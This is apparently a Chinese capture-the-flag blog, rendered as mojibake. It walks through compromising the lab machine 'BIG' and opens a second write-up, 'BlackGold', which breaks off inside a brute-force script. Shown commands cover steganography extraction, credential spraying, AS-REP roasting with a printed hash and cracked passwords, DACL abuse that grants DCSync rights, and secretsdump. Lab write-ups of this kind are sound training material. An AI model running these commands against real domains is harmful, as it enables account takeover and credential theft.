### ç›®å½•æ‰«æ

`HTTP` æœåŠ¡

![image.png](/post-images/TheHackersLabsB%20I%20G/image1.png)

> ä¸¤æ®µæ­Œè¯çš„æ¥æº
> 
> 
> ### **I keep it music music, I eat that lunch (Yeah)**
> 
> - **æ¥æº:** è¿™å¥æ­Œè¯å‡ºè‡ª **Travis Scott** 2023å¹´ä¸“è¾‘ã€ŠUTOPIAã€‹ä¸­çš„å¤§çƒ­å•æ›² **ã€ŠFE!Nã€‹**ï¼Œæ˜¯å®¢ä¸²çš„æ­Œæ‰‹ **Playboi Carti** çš„éƒ¨åˆ†ã€‚
> - **å«ä¹‰è§£æ:** è¿™å¥æ­Œè¯æ˜¯å…¸å‹çš„Playboi Cartié£æ ¼ï¼Œç”¨æç®€ä½†å……æ»¡æ€åº¦çš„è¯­è¨€æ¥è¡¨è¾¾è‡ªå·±çš„çŠ¶æ€ã€‚
>     - **`I keep it music music`**: è¿™å¥è¯çš„æ„æ€æ˜¯â€œæˆ‘çš„ä¸–ç•Œé‡Œåªæœ‰éŸ³ä¹ï¼Œæˆ‘ä¸€ç›´ä¸“æ³¨äºéŸ³ä¹â€ã€‚ä»–ç”¨é‡å¤çš„â€œmusic musicâ€æ¥å¼ºè°ƒè‡ªå·±å®Œå…¨æ²‰æµ¸åœ¨åˆ›ä½œå’ŒéŸ³ä¹çš„æ°›å›´ä¸­ï¼Œè¿™æ˜¯ä»–ç”Ÿæ´»çš„æ ¸å¿ƒå’Œå…¨éƒ¨é‡å¿ƒã€‚è¿™æ˜¯ä¸€ç§å¯¹è‡ªå·±è‰ºæœ¯å®¶èº«ä»½çš„å¼ºè°ƒã€‚
>     - **`I eat that lunch`**: è¿™æ˜¯ä¸€å¥éå¸¸å½¢è±¡çš„ä¿šè¯­ï¼Œæ„æ€æ˜¯**â€œæˆ‘è½»æ¾æå®šä¸€åˆ‡â€ã€â€œæˆ‘æŠŠç«äº‰å¯¹æ‰‹éƒ½å¹²æ‰äº†â€**ã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œåƒåˆé¤æ˜¯ä¸€ä»¶å¤šä¹ˆè½»æ¾æ—¥å¸¸çš„äº‹æƒ…ã€‚ä»–ç”¨è¿™ä¸ªæ¯”å–»æ¥è¡¨ç¤ºä»–åœ¨è¯´å”±æ¸¸æˆï¼ˆRap Gameï¼‰ä¸­æ¸¸åˆƒæœ‰ä½™ï¼ŒæŠŠå‡»è´¥å¯¹æ‰‹ã€å–å¾—æˆåŠŸçœ‹å¾—åƒåƒåˆé¥­ä¸€æ ·ç®€å•ã€‚è¿™æ˜¯ä¸€ç§æåº¦è‡ªä¿¡å’Œå‚²æ…¢çš„ç‚«è€€ï¼ˆBraggingï¼‰ã€‚
> 
> ---
> 
> ### **It was all a dream**
> 
> **å®ƒæ˜¯ä¸€ä¸ªæ–‡åŒ–ç¬¦å·ï¼Œæ˜¯å˜»å“ˆå†å²ä¸Šæœ€ç»å…¸ã€æœ€æ ‡å¿—æ€§çš„å¼€åœºç™½ä¹‹ä¸€ã€‚**
> 
> - **æ¥æº:** è¿™å¥æ­Œè¯å‡ºè‡ªä¼ å¥‡è¯´å”±æ­Œæ‰‹ **The Notorious B.I.G. (åˆå Biggie Smalls)** åœ¨1994å¹´å‘å¸ƒçš„æ­Œæ›² **ã€ŠJuicyã€‹**ã€‚è¿™é¦–æ­Œæ˜¯ä»–çš„é¦–å¼ ä¸“è¾‘ã€ŠReady to Dieã€‹ä¸­çš„ä¸»æ‰“å•æ›²ï¼Œä¹Ÿæ˜¯ä»–çš„æˆåä½œã€‚
> - **åŸæ–‡å’ŒèƒŒæ™¯:** å®Œæ•´çš„å¼€åœºæ˜¯ï¼š
>     
>     "It was all a dream, I used to read Word Up! magazine
>     Salt-n-Pepa and Heavy D up in the limousine"
>     

---

å¯¹ç½‘ç«™ç›®å½•çˆ†ç ´

```bash
âœ  BIG feroxbuster --url http://192.168.212.4 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x php,zip,txt
                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://192.168.212.4
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ’²  Extensions            â”‚ [php, zip, txt]
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      151c http://192.168.212.4/images => http://192.168.212.4/images/
200      GET       21l       41w      435c http://192.168.212.4/
301      GET        2l       10w      153c http://192.168.212.4/contents => http://192.168.212.4/contents/
[>-------------------] - 5s     48285/2491564 5m      found:3       errors:0      
301      GET        2l       10w      150c http://192.168.212.4/songs => http://192.168.212.4/songs/
200      GET        5l       22w      112c http://192.168.212.4/contents/notify.txt
200      GET       74l      667w     3350c http://192.168.212.4/songs/juicy.txt
200      GET      396l     2780w   362382c http://192.168.212.4/images/big4.jpg
200      GET      396l     2780w   362232c http://192.168.212.4/images/big2.jpg
[####################] - 8m   3322088/3322088 0s      found:6       errors:0      
[####################] - 8m    830516/830516  1683/s  http://192.168.212.4/ 
[####################] - 8m    830516/830516  1676/s  http://192.168.212.4/images/ 
[####################] - 8m    830516/830516  1676/s  http://192.168.212.4/contents/ 
[####################] - 8m    830516/830516  1684/s  http://192.168.212.4/songs/
```

`Skyisthelimit.txt` è¿˜æ˜¯ä¸€ä¸ªå­—å…¸

![image.png](/post-images/TheHackersLabsB%20I%20G/image2.png)

![image.png](/post-images/TheHackersLabsB%20I%20G/image3.png)

### å›¾ç‰‡éšå†™

è¿™ä¸€éƒ¨åˆ†çœ‹äº†ä¸€ä¸‹ write-up

`notify.txt` 

![image.png](/post-images/TheHackersLabsB%20I%20G/image4.png)

> *â€œä½ åˆ°åº•é›‡äº†å“ªä¸ªè¯¥æ­»çš„å®¶ä¼™æ¥åšè¿™ä¸ªç½‘ç«™ï¼â€
â€œåˆæŠŠå¯†é’¥ç”¨ MD5 è—èµ·æ¥ï¼â€
â€œæˆ‘è¦ç‚’äº†é‚£ä¸ªå®¶ä¼™â€*
> 

é‚£ä¹ˆå¯†ç å¯èƒ½æ˜¯ `music` çš„ `MD5` å€¼

```bash
âœ  BIG echo -n "music" | md5sum                                                 
18d6769919266cd0bd6cd78aa405d5d0  -
```

é‚£ä¹ˆè¦åœ¨å“ªé‡Œä½¿ç”¨å¯†ç ï¼Ÿè—èµ·æ¥æ„Ÿè§‰æ˜¯`MISC`äº†

æˆ‘ä»¬å°† `images/big.jpg` å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨ `steghide` æ¥å¯¼å‡ºæ•°æ®

```bash
âœ  BIG steghide extract -sf big1.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
âœ  BIG steghide extract -sf big2.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
âœ  BIG steghide extract -sf big3.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
âœ  BIG steghide extract -sf big4.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

ä½†æ˜¯å¯†ç ä¸å¯¹ï¼Œä¸»é¡µä¸­è¿˜æœ‰å‡ æ®µæ­Œè¯ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹

![image.png](/post-images/TheHackersLabsB%20I%20G/image5.png)

```bash
âœ  BIG echo -n "I keep it music music" | md5sum
a6002952ffda89154a38a248280093d2  -
âœ  BIG echo -n "I eat that lunch (Yeah)" | md5sum
d2b5f22e80f680d9660a1d3ab81232fd  -
âœ  BIG echo -n "It was all a dream" | md5sum
99ae77c0c0faf78b872f9f452e3eaa24  -
```

èƒ½å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ `frase.txt` ï¼Œä½¿ç”¨ MD5 `99ae77c0c0faf78b872f9f452e3eaa24`

```bash
âœ  BIG steghide extract -sf big2.jpg            
Enter passphrase: 
steghide: could not extract any data with that passphrase!
âœ  BIG steghide extract -sf big2.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
âœ  BIG steghide extract -sf big2.jpg
Enter passphrase: 
wrote extracted data to "frase.txt".
âœ  BIG steghide extract -sf big3.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
âœ  BIG steghide extract -sf big3.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
âœ  BIG steghide extract -sf big3.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
âœ  BIG steghide extract -sf big4.jpg  
Enter passphrase: 
steghide: could not extract any data with that passphrase!
âœ  BIG steghide extract -sf big4.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
âœ  BIG steghide extract -sf big4.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

é‡Œè¾¹æ˜¯ä¸ªå¯†ç 

```bash
âœ  BIG cat frase.txt           
Bigpoppa1972
```

> å£°åç‹¼è—‰å…ˆç”Ÿï¼ˆThe Notorious B.I.G.ï¼Œ1972å¹´5æœˆ21æ—¥â€”â€”1997å¹´3æœˆ9æ—¥ï¼‰
> 

### æšä¸¾ç”¨æˆ·å

æœ‰äº†å¯†ç ï¼Œä½†æ˜¯ä¸çŸ¥é“çš„ç”¨åœ¨å“ª

æ ¹æ®å‰é¢å¾—åˆ°çš„ä¿¡æ¯ï¼Œ`music` æˆ–è€… `Juice`ä¹Ÿå¯èƒ½æ˜¯ç”¨æˆ·å

```bash
Who the hell did you hire to create the website!
Hiding keys in MD5 again!
I'm going to fire that guy

music
```

æµ‹è¯•å‡­æ®

```bash
âœ  ~ nxc smb 192.168.212.4 -u music -p Bigpoppa1972                    
SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False) 
SMB         192.168.212.4   445    BIG              [+] bbr.thl\music:Bigpoppa1972 

âœ  ~ nxc wmi 192.168.212.4 -u music -p Bigpoppa1972
RPC         192.168.212.4   135    BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)
RPC         192.168.212.4   135    BIG              [+] bbr.thl\music:Bigpoppa1972 

âœ  ~ nxc ldap 192.168.212.4 -u music -p Bigpoppa1972
LDAP        192.168.212.4   389    BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)
LDAP        192.168.212.4   389    BIG              [+] bbr.thl\music:Bigpoppa1972 
```

è¿œç¨‹ç™»å½•ï¼Œè¿›å»æ˜¯`TEMP`ç”¨æˆ·

![image.png](/post-images/TheHackersLabsB%20I%20G/image6.png)

å½“å‰ç›®å½•ä¸‹å¯ä»¥æ‹¿åˆ° `user.txt`

```bash
*Evil-WinRM* PS C:\Users\music\Documents> type user.txt
53bxxxxxxxxxxxxxxxxxxx
```

## åŸŸåˆ†æ

æ”¶é›†ä¿¡æ¯

```bash
âœ  ~ bloodhound-python -d 'bbr.thl' -ns 192.168.212.4 --zip -c All -dc 'BIG.bbr.thl' -u music -p Bigpoppa1972
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: bbr.thl
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: BIG.bbr.thl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: BIG.bbr.thl
INFO: Found 7 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: BIG.bbr.thl
INFO: Done in 00M 01S
INFO: Compressing output into 20250718165617_bloodhound.zip
```

ç”¨æˆ·ç»„ä¿¡æ¯

![image.png](/post-images/TheHackersLabsB%20I%20G/image7.png)

å¾ˆæ˜æ˜¾ï¼Œç›®æ ‡ç”¨æˆ·æ˜¯`SONG`

![image.png](/post-images/TheHackersLabsB%20I%20G/image8.png)

é€šè¿‡ `BLoodhound` å¯ä»¥çœ‹åˆ°å¯ä»¥ç”¨ `AS-REP` æ¥æ‰“

![image.png](/post-images/TheHackersLabsB%20I%20G/image9.png)

## **AS_REP Roasting**

```bash
âœBIG GetNPUsers.py -dc-ip 192.168.212.4 bbr.thl/ -usersfile users
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$song@BBR.THL:6d769bdfb04e89789dae27e05b47a393$cde1b6fd59270bc8bfd31470ea4d007ac3fe3750ad8d54b6ec2a63e75495569286eb887787747eeb57c690dfacfb3c913823b0c539ce23ddba0fdbc6bacae8f19530
cb25f73664a3feafd432ee89e6b56fd6ace082c511a5041b79ef1c8c836b8b3636dca11ed49ff2c372cbf0dd06b184a2575656d41440d7c16e58e8262c3c5a30627c467f84e4dcc83ee19e235bd6168c8abd780d6927f7315a1e16b46cf6570e
ba13b09664cd2cac4a2478c4e67e75d5335a7b61260f79d553d76e96b24ea282d78977e449b130c405a4c2de4c42930f958c8616debbce85dde09896ba30b352
```

ä½¿ç”¨ `hashcat` ç ´è§£ï¼Œä½¿ç”¨ä¸Šé¢çš„çš„å­—å…¸

```bash
âœ  BIG hashcat -m 18200 hash Skyisthelimit.txt
```

å¾—åˆ°å¯†ç  `Passwordsave@`

![image.png](/post-images/TheHackersLabsB%20I%20G/image10.png)

æµ‹è¯•å‡­æ®

```bash
âœ  BIG nxc smb 192.168.212.4 -u song -p Passwordsave@ 
SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False) 
SMB         192.168.212.4   445    BIG              [+] bbr.thl\song:Passwordsave@ 
```

## æƒé™æå‡

å¯»æ‰¾åˆ©ç”¨é“¾ï¼Œé‡æ–°è·å–ä¸€ä¸‹æ•°æ®

```bash
bloodhound-python -d 'bbr.thl' -ns 192.168.212.4 --zip -c All -dc 'BIG.bbr.thl' -u song -p Passwordsave@
```

### é“¾å­ 1 âŒ

![image.png](/post-images/TheHackersLabsB%20I%20G/image11.png)

å°† `Song` æ·»åŠ  `SPECIAL PERMISSIONS` 

```bash
$SecPassword = ConvertTo-SecureString 'Passwordsave@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('bbr\song', $SecPassword)
Add-DomainGroupMember -Identity 'SPECIAL PERMISSIONS' -Members 'song' -Credential $Cred
```

![image.png](/post-images/TheHackersLabsB%20I%20G/image12.png)

`DACL` æ»¥ç”¨ï¼Œèµ‹äºˆè‡ªå·±æ‹¥æœ‰`users`çš„æ‰€æœ‰æƒé™

```bash
âœ  BIG bloodyAD -d 'bbr.thl' -u song -p 'Passwordsave@' --dc-ip 192.168.212.4 add genericAll 'CN=USERS,DC=BBR,DC=THL' song
[+] song has now GenericAll on CN=USERS,DC=BBR,DC=THL
```

ä¿®æ”¹`administrator`å¯†ç ï¼Œå¤±è´¥ï¼Œå› ä¸º`administrator` æ˜¯ä¿æŠ¤ç”¨æˆ·ï¼Œä¸èƒ½ç›´æ¥ä¿®æ”¹å¯†ç 

### é“¾å­ 2

æˆ‘ä»¬ç›´æ¥æ§åˆ¶åŸŸ

![image.png](/post-images/TheHackersLabsB%20I%20G/image13.png)

```bash
âœ  BIG bloodyAD -d 'bbr.thl' -u song -p 'Passwordsave@' --dc-ip 192.168.212.4 add genericAll 'DC=BBR,DC=THL' song                             
[+] song has now GenericAll on DC=BBR,DC=THL
```

å†æ·»åŠ ä¸€ä¸ª`Dcsync`æƒé™ç»™è‡ªå·±

```bash
âœ  BIG bloodyAD -d 'bbr.thl' -u song -p 'Passwordsave@' --dc-ip 192.168.212.4 add dcsync song
[+] song is now able to DCSync
```

`Dcsync`ï¼Œä½¿ç”¨ `secretsdump`

```bash
secretsdump.py bbr.thl/song:'Passwordsave@'@192.168.212.4 -dc-ip 192.168.212.4
```

![image.png](/post-images/TheHackersLabsB%20I%20G/image14.png)

![image.png](/post-images/TheHackersLabsB%20I%20G/image15.png)

è¯»å– `root.txt`

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat root.txt
8e8xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## æ€»ç»“

éš¾ç‚¹åœ¨`Web`ä¸Šï¼Œä¸€æ—¶åŠä¼šå†™ä¸å‡ºæ¥

ä½†æ˜¯æ‹¿åˆ°`user`åå°±å¾ˆç®€å•äº†ï¼Œä¸€æŠŠæ¢­å“ˆ]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>Domain</category>
            <category>AD</category>
            <category>MISC</category>
            <category>AS_REPRoat</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - BlackGold]]></title>
            <link>https://www.sunsetaction.top/2025/07/15/TheHackersLabsBlackGold</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/15/TheHackersLabsBlackGold</guid>
            <pubDate>Tue, 15 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[BlackGold https://labs.thehackerslabs.com/machine/9 Recon ç«¯å£æ‰«æ è®¿é—® HTTP æœåŠ¡ï¼Œé€šè¿‡IISæ­å»º ç›®å½•æ‰«æï¼Œæ²¡å‘ç°ä»€ä¹ˆå¯ç–‘çš„æ–‡ä»¶å¤¹ é¡µé¢æ‹‰åˆ°ä¸‹é¢å¯ä»¥ä¸‹è½½ PDF æ–‡ä»¶ å›¾ç‰‡ä¸Šä¸¤ä¸ªPDFå†…å®¹éƒ½éƒ½æ˜¯æ— ç”¨çš„ï¼Œæˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹PDFå…ƒä¿¡æ¯ ä½œè€…ä¿¡...]]></description>
            <content:encoded><![CDATA[
# BlackGold

> https://labs.thehackerslabs.com/machine/9
> 

![image.png](/post-images/TheHackersLabsBlackGold/image.png)

## Recon

ç«¯å£æ‰«æ

```bash
âœ  BlackGold nmap -sP 192.168.56.0/24                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:30 CST
Nmap scan report for 192.168.56.1
Host is up (0.00030s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00031s latency).
MAC Address: 08:00:27:B8:0A:4D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.10
Host is up (0.00038s latency).
MAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.5
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 28.11 seconds
```

```bash
âœ  BlackGold nmap -sT -min-rate 10000 -p- 192.168.56.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:32 CST
Nmap scan report for 192.168.56.10
Host is up (0.00066s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
65047/tcp open  unknown
65051/tcp open  unknown
65052/tcp open  unknown
65062/tcp open  unknown
65071/tcp open  unknown
MAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 26.45 seconds
```

```bash
âœ  BlackGold nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:33 CST
Nmap scan report for 192.168.56.10
Host is up (0.00038s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title:  Neptune
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-14 16:33:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
65047/tcp open  msrpc         Microsoft Windows RPC
65051/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
65052/tcp open  msrpc         Microsoft Windows RPC
65062/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-07-14T16:34:35
|_  start_date: N/A
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:31:d9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
|_clock-skew: -2s

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms 192.168.56.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.63 seconds
```

è®¿é—® `HTTP` æœåŠ¡ï¼Œé€šè¿‡`IIS`æ­å»º

![image.png](/post-images/TheHackersLabsBlackGold/image1.png)

ç›®å½•æ‰«æï¼Œæ²¡å‘ç°ä»€ä¹ˆå¯ç–‘çš„æ–‡ä»¶å¤¹

```bash
âœ  BlackGold gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,zip -u http://192.168.56.10
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.10
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 151] [--> http://192.168.56.10/images/]
/docs                 (Status: 301) [Size: 149] [--> http://192.168.56.10/docs/]
/Images               (Status: 301) [Size: 151] [--> http://192.168.56.10/Images/]
/css                  (Status: 301) [Size: 148] [--> http://192.168.56.10/css/]
/js                   (Status: 301) [Size: 147] [--> http://192.168.56.10/js/]
/Docs                 (Status: 301) [Size: 149] [--> http://192.168.56.10/Docs/]
/fonts                (Status: 301) [Size: 150] [--> http://192.168.56.10/fonts/]
/IMAGES               (Status: 301) [Size: 151] [--> http://192.168.56.10/IMAGES/]
/Fonts                (Status: 301) [Size: 150] [--> http://192.168.56.10/Fonts/]
/CSS                  (Status: 301) [Size: 148] [--> http://192.168.56.10/CSS/]
/JS                   (Status: 301) [Size: 147] [--> http://192.168.56.10/JS/]
/DOCS                 (Status: 301) [Size: 149] [--> http://192.168.56.10/DOCS/]
Progress: 661677 / 661680 (100.00%)
===============================================================
Finished
===============================================================
```

é¡µé¢æ‹‰åˆ°ä¸‹é¢å¯ä»¥ä¸‹è½½ `PDF` æ–‡ä»¶

![image.png](/post-images/TheHackersLabsBlackGold/image2.png)

å›¾ç‰‡ä¸Šä¸¤ä¸ª`PDF`å†…å®¹éƒ½éƒ½æ˜¯æ— ç”¨çš„ï¼Œæˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹`PDF`å…ƒä¿¡æ¯

```bash
âœ  BlackGold pdfinfo 2024-02-15.pdf 
Title:           Certificado de Cumplimiento de Normativas Ambientales
Subject:         
Keywords:        
Author:          James Clear
Creator:         Neptune Oil & Gas
Producer:        pdf-lib (https://github.com/Hopding/pdf-lib)
CreationDate:    Thu Feb 15 11:00:00 2024 CST
ModDate:         
Custom Metadata: no
Metadata Stream: no
Tagged:          yes
UserProperties:  no
Suspects:        no
Form:            none
JavaScript:      no
Pages:           2
Encrypted:       no
Page size:       596 x 842 pts (A4)
Page rot:        0
File size:       58258 bytes
Optimized:       no
PDF version:     1.7

âœ  BlackGold pdfinfo 2024-11-29.pdf 
Title:           Informe de Sostenibilidad 2024
Subject:         Informe sobre sostenibilidad y reducciÃ³n de emisiones de CO2
Keywords:        
Author:          David Brown
Creator:         Neptune Oil & Gas
Producer:        ReportLab PDF Library - www.reportlab.com
CreationDate:    Thu Feb 27 06:07:22 2025 CST
ModDate:         Thu Feb 27 06:07:22 2025 CST
Custom Metadata: no
Metadata Stream: no
Tagged:          no
UserProperties:  no
Suspects:        no
Form:            none
JavaScript:      no
Pages:           1
Encrypted:       no
Page size:       612 x 792 pts (letter)
Page rot:        0
File size:       2110 bytes
Optimized:       no
PDF version:     1.5
```

ä½œè€…ä¿¡æ¯ä¸­èƒ½å¾—åˆ°ä¸¤ä¸ªç”¨æˆ·å`David.Brown` å’Œ `James.Clear` ï¼Œå¯èƒ½æ˜¯åŸŸç”¨æˆ·

## **AS_REP Roasting âŒ**

å¾—åˆ°ä¸¤ä¸ªç”¨æˆ·åï¼Œé¦–å…ˆå°è¯•ä¸€ä¸‹ ****`AS_REP Roasting`

```bash
âœ  BlackGold GetNPUsers.py -dc-ip 192.168.56.10 -dc-host neptune.thl nwptune.htl/ -usersfile users.txt
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
```

## è·¯å¾„çˆ†ç ´

è§‚å¯Ÿåˆ°ä¸‹è½½`PDF`çš„è·¯å¾„æ˜¯ï¼š`http://192.168.56.10/docs/2024-11-29.pdf`

æ˜¯æ ¹æ®æ—¥æœŸå‘½åï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹é€šè¿‡æ—¥æœŸçˆ†ç ´ä¸€ä¸‹

![image.png](/post-images/TheHackersLabsBlackGold/image3.png)

æœ€åèƒ½çˆ†ç ´åˆ°`192`ä¸ª`PDF`æ–‡æ¡£

![image.png](/post-images/TheHackersLabsBlackGold/image4.png)

è¿™é‡Œä½¿ç”¨`yakit`æ— æ³•å¯¼å‡ºæ–‡ä»¶ï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦å†™`python`è„šæœ¬æ¥çˆ†ç ´â€¦

```bash
import requests
import datetime
import os

# --- é…ç½® ---
HOST = "192.168.56.10"
PORT = 80  # æ ¹æ®éœ€è¦ä¿®æ”¹ HTTP ç«¯å£
BASE_URL = f"http://{HOST}:{PORT}"

START_YEAR = 2023
